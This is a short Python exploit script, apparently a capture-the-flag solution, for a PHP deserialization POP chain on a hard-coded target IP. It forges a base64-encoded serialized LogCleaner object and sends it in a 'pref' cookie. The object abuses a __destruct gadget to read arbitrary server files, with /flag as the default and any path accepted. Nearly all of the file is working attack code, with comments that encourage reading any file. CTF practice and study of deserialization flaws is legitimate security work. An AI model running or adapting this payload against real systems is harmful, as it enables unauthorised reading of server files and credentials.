#!/usr/bin/env python3
"""
Q39 - 综合 · PHP 反序列化 POP 链
目标: http://47.120.76.57:34966/
思路: Cookie pref = base64(serialize(obj))，服务端 unserialize 无 allowed_classes
      代码里存在 LogCleaner::__destruct，当 enabled=true 时
      echo file_get_contents($this->logfile) -> 任意文件读 -> 读 /flag
"""
import base64
import re
import sys
import urllib.request

TARGET = "http://47.120.76.57:34966/"
FILE = "/flag"  # 想读什么文件就改这里


def build_payload(path: str) -> str:
    """手写 PHP 序列化字符串并 base64 编码。
    注意: s:<len>:... 这里 <len> 是字节数 (utf-8)。
    """
    p = path.encode()
    raw = (
        b'O:10:"LogCleaner":2:'
        b'{s:7:"logfile";s:' + str(len(p)).encode() + b':"' + p + b'";'
        b's:7:"enabled";b:1;}'
    )
    return base64.b64encode(raw).decode()


def exploit(url: str, path: str) -> str:
    cookie = build_payload(path)
    req = urllib.request.Request(url, headers={"Cookie": f"pref={cookie}"})
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode(errors="replace")
    m = re.search(r"<pre>(.*?)</pre>", body, re.S)
    return (m.group(1) if m else body).strip()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    fpath = sys.argv[2] if len(sys.argv) > 2 else FILE
    data = exploit(target, fpath)
    print(f"[+] {fpath} =>\n{data}")
    flag = re.search(r"TOGOGO-flag\{[^}]+\}", data)
    if flag:
        print(f"\n[FLAG] {flag.group(0)}")
